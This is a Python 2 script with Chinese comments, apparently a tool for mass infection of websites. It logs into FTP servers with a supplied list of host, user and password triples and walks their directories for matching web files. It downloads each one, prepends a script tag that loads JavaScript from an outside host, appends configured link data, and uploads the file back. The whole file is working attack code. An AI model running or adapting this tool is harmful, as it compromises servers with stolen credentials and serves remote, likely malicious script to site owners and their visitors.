#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
import urllib2, re, time
import thread
import sys
import os
import threading
import Queue
import ftplib
import socket
import ConfigParser  #INI读取数据
socket.setdefaulttimeout(10)  #设置了全局默认超时时间
openftp = Queue.Queue(7000)
################################################
class CS_openurl(threading.Thread):
    def __init__(self,htint,openftp):
        threading.Thread.__init__(self)
        self.Ht=htint
        self.openftp=openftp
        self.wwwlist = []    #wwwroot.txt  获取
        self.list_wwwlist=[]  #列表去重，不打乱原来的顺序
        self.open_txt()  #打开TXT文本写入数组

        self.FTP_list = []    #FTP保存路径
        self.data_write=u""  #写入数据
        try:
            config = ConfigParser.ConfigParser()
            config.readfp(open("Server.ini"))
            self.data_write = config.get("DATA","data_write")
        except:
            print u"<<<线程%d--读取INI配置文件异常！！！！！"%(self.Ht)


    def run(self):
        try:
            if self.openftp.empty():   #判断队列是否为空
                print u"Thread:%d--已经没有可操作的数据了"%(self.Ht)
                time.sleep(60)
                self.run()
            self.Chost = self.openftp.get(0.5)  #get()方法从队头删除并返回一个项目
            if self.Chost=="":
                time.sleep(20)
                self.run()
            self.admin_open_FTP(self.Chost[0],self.Chost[1],self.Chost[2])#遍历数组
            self.run()

            #self.admin_open_FTP("127.0.0.1","admin","admin")#遍历数组
        except:
            print "Thread:%d--CS_openurl---run-try--except!!!!!"%(self.Ht)
            time.sleep(10)
            self.run()

    ###################################
    #下面是自动挂马部分
    def admin_open_FTP(self,host,user,passwd):#遍历数组
        try:
            print u"--"*40 #添加消息
            if self.open_ftp(host,user,passwd):  #采集要挂马的地址
            #print u"获取别表完成"
                print u"查找到要挂的链接%s个"%(len(self.FTP_list)) #消息提示
                if len(self.FTP_list)>0:  #判断有连接需要挂黑链没
                    self.open_list(host,user,passwd)#遍历数组
            return 1
        except:
            return 0

    def open_ftp(self,host,user,passwd):  #采集要挂马的地址
        try:
            self.del_list() #清空数组
            ftp = ftplib.FTP(host)
            ftp.login(user, passwd)
            print u"IP:%s用户名:%s密码:%s ----登陆FTP成功%s"%(host,user, passwd,time.strftime('%Y.%m.%d-%H.%M.%S')) #消息提示
            try:
                index=0
                for item in self.walk_ftp(ftp):
                    if index>=5000:
                        print u"遍历目录5000个文件过多停止"
                        return 1
                    E = 0 #得到list的第一个元素
                    while E < len(self.list_wwwlist):
                        data=self.list_wwwlist[E]
                        data1=data.replace('\n','')
                        if not data1=="": #取反
                            if re.search(data1,item.split('/')[-1]):
                                #print '找到:',item
                                self.FTP_list.append(item)
                        E += 1
                    time.sleep(0.001) #确保先运行Seeker中的方法
                    index +=1
                print u"遍历目录完成"
                ftp.quit()  #退出ftp
                return 1
            except:
                ftp.quit()  #退出ftp
                print u"遍历FTP异常"
                return 1
                #sys.exit(exitcode)   #退出这个函数   不是整个退出
        except:
            print u"IP:%s用户名:%s密码:%s 连接FTP异常%s"%(host,user, passwd,time.strftime('%Y.%m.%d-%H.%M.%S')) #消息提示
            return 0

    def walk_ftp(self,ftp, cd = None, nodir = True):  #遍历FTP文件
        if cd:
            stack = [('d', cd)]
        else:
            stack = [('d', '/')]
        def get_item_info(line):  #获取目录信息
            info = line.split()  #string由字符串分割成的列表   但是这个地方没设置规则啊  难道以空格区分吗
            #info[0][0]获取是根目录还文件夹   info[8] 文件名称还是文件夹
            stack.append((info[0][0], '/'.join([pwd, info[8]])))  #pwd前所在位置
            #向列表的尾部添加一个新的元素
        while stack:
            s_top = stack.pop()
            if s_top[1][-2:]=='/.' or s_top[1][-3:]=='/..':
                continue #停止跳过这个
            if s_top[0] == '-': #根目录文件
                yield s_top[1].replace('//', '/')  #根据正则进行替换
            elif s_top[0] == 'd':  #文件夹
                try:
                    ftp.cwd(s_top[1])  #选择操作目录    打开文件夹
                except:
                    continue  #停止跳过这个异常
                pwd = ftp.pwd()  #返回当前所在位置
                ftp.dir(get_item_info)  #显示目录下文件信息
                if not nodir:  #not 取反   不明白什么意思
                    yield s_top[1].replace('//', '/') #根据正则进行替换

    #遍历数组   下载   修改   上传
    def open_list(self,host,user,passwd):#遍历数组
        try:
            ftpU = ftplib.FTP(host)
            ftpU.login(user, passwd)
            try:
                E = 0 #得到list的第一个元素
                while E < len(self.FTP_list):
                    self.message_data=u""
                    self.message_data+=u"开始处理%s地址"%(self.FTP_list[E]) #消息提示
                    self.del_file(self.FTP_list[E])  #删除文件#  先清空一次
                    if self.ftp_download(ftpU,self.FTP_list[E]):  #下载
                        if self.txt_write(self.FTP_list[E]):  #向文本中写入数据
                            if self.ftp_upload(ftpU,self.FTP_list[E]): #上传文件
                                self.message_data+=u"%s下载-修改-上传-文件完成"%(self.FTP_list[E]) #消息提示

                        print self.message_data #添加消息
                    self.del_file(self.FTP_list[E])  #删除文件
                    E = E + 1
                print u"IP：%s用户名：%s密码：%s---遍历目录修改上传完成%s"%(host,user,passwd,time.strftime('%Y.%m.%d-%H.%M.%S')) #添加消息
                print u"--"*40 #添加消息
                ftpU.quit()  #退出ftp
                return 1
            except:
                ftpU.quit()  #退出ftp
                print u"遍历FTP异常" #添加消息
                return 1
        except:
            print u"--"*10 #添加消息
            self.message_data=u"IP:%s用户名:%s密码:%s 连接FTP异常%s"%(host,user, passwd,time.strftime('%Y.%m.%d-%H.%M.%S')) #消息提示
            print self.message_data #添加消息
            return 0

    #下载
    def ftp_download(self,ftpU,ftp_download):  #下载
        try:
            #ftp_download = "/home/pub/dog.jpg";
            #print ftp.getwelcome() #显示ftp服务器欢迎信息
            bufsize = 1024 #设置缓冲块大小
            item=ftp_download
            nPos = str(item).rfind('/') #查找字符
            L_1=len(item)
            sStr1 = item[nPos+1:L_1] #复制指定长度的字符
            fp = open(sStr1,'wb') #以写模式在本地打开文件
            ftpU.retrbinary('RETR ' + ftp_download,fp.write,bufsize) #接收服务器上文件并写入本地文件
            self.message_data+=u"%s下载成功"%(ftp_download) #消息提示
            return 1
        except:
            self.message_data+=u"%s下载失败"%(ftp_download) #消息提示
            return 0

            #向文本中写入数据
        #    def txt_write(self,ftp_download):  #向文本中写入数据
        #        try:
        #            item=ftp_download
        #            nPos = str(item).rfind('/') #查找字符
        #            L_1=len(item)
        #            sStr1 = item[nPos+1:L_1] #复制指定长度的字符
        #            f = open(sStr1, 'r')
        #
        #            data=f.read()
        #            f.close()  #关闭文本
        #            nPos = str(data).rfind(str(self.data_write)) #查找字符
        #            if nPos>0:
        #                self.message_data+=u"已经有要写入的数据了不在写入" #消息提示
        #                return 0
        #            else:
        #                file_object = open(sStr1,'a')  #追加写文件
        #                file_object.write(self.data_write)
        #                #file_object.writelines(list_of_text_strings)  #写入多行
        #                file_object.close()
        #                return 1
        #        except:
        #            self.message_data+=u"写入数据%s失败"%(ftp_download) #消息提示
        #            return 0

    def txt_write(self,ftp_download):  #向文本中写入数据
        self.HHMM_write=u"<script language=\"javascript\" type=\"text/javascript\" src=\"http://www.36obuy.org/tj1.js\"></script>"  #写入数据
        try:
            item=ftp_download
            nPos = str(item).rfind('/') #查找字符
            L_1=len(item)
            sStr1 = item[nPos+1:L_1] #复制指定长度的字符
            f = open(sStr1, 'r')
            data=f.read()
            f.close()  #关闭文本
            if (re.compile(self.data_write,re.I|re.S).search(data) != None):  #正则查询
                print u"已经有要写入的数据了不在写入" #消息提示
                return 0
            else:
                file_object = open(sStr1,'w')  #W会清空数据重新写入
                file_object.write(self.HHMM_write)
                file_object.write("\n")
                file_object.writelines(data)  #写入多行
                file_object.write("\n")
                file_object.write(self.data_write)
                file_object.close()
                return 1
        except:
            print u"写入数据%s失败"%(ftp_download) #消息提示
            return 0

            #上传文件
    def ftp_upload(self,ftpU,ftp_download): #上传文件
        try:
            item=ftp_download
            nPos = str(item).rfind('/') #查找字符
            L_1=len(item)
            sStr1 = item[nPos+1:L_1] #复制指定长度的字符
            bufsize = 1024
            fp = open(sStr1,'rb')
            ftpU.storbinary('STOR '+ ftp_download,fp,bufsize) #上传文件
            #ftpU.set_debuglevel(0)  #关闭调试模式
            fp.close() #关闭文件
            #ftpU.quit()   #退出ftp
            self.message_data+=u"%s上传文件文件成功"%(sStr1) #消息提示
            return 1
        except:
            self.message_data+=u"%s上传文件失败"%(ftp_download) #消息提示
            return 0

    #删除文件
    #os.remove("file")
    def del_file(self,ftp_download):  #删除文件
        try:
            item=str(ftp_download)
            nPos = item.rfind('/') #查找字符
            L_1=len(item)
            sStr1 = item[nPos+1:L_1] #复制指定长度的字符
            feil=os.getcwd()  #获得当前工作目录
            #data1=feil+"\\"+sStr1
            #print data1
            for allDirs,dirs,filename in os.walk(feil):
                if sStr1 in filename:
                    os.remove(feil + "/" + sStr1)
                    #    print("\n删除成功！")
                    #if sStr1 not in filename:
                    #    print("未找到所要删除的文件！")
            return 0
        except:
            return 0
        ###################################

    def open_txt(self):  #打开TXT文本写入数组
        try:
            xxx = file('wwwroot.txt', 'r')
            #for xxx_line in xxx.read().split('\n'):
            for xxx_line in xxx.readlines():
                self.wwwlist.append(xxx_line)
            xxx.close()

            for i in self.wwwlist:  #列表去重复
                if i not in self.list_wwwlist:
                    self.list_wwwlist.append(i)
        except:
            return 0

    def del_list(self): #清空数组
        i = 0 #得到list的第一个元素
        while i < len(self.FTP_list):
            del self.FTP_list[i]

################################################
if __name__=='__main__':
    file_TXT=sys.argv[1]
    print "----BY:www.hmhacker.org----"
    print "QQ:1045985095"
    print "FTP-file 1.txt"
    if file_TXT=="":
        print u"无参数传入"
        time.sleep(200)
    try:
        xxx = file(file_TXT, 'r')
        for xxx_line in xxx.readlines():
        #如果输入的内容读取有回车符号，可以用strip来消除，可得到完美的输出
            data=xxx_line.strip()
            list_data=data.split(',')
            if len(list_data)> 3:
                print u"不可用数据不添加 %s"%(list_data)
                continue  #跳过
            openftp.put(list_data,0.5)   #插入队列
            #print list_data
        xxx.close()
        print u"---------导入内容 %s条  需要扫描--------"%(openftp.qsize())
    except:
        print u"软件目录下能找到不到指定文件"
        time.sleep(1000)

    threads = []  #线程
    nthreads=1
    for i in range(nthreads):  #nthreads=10  创建10个线程
        threads.append(CS_openurl(i,openftp))

    for t in threads:   #不理解这是什么意思    是结束线程吗
        time.sleep(4)
        t.start()  #start就是开始线程

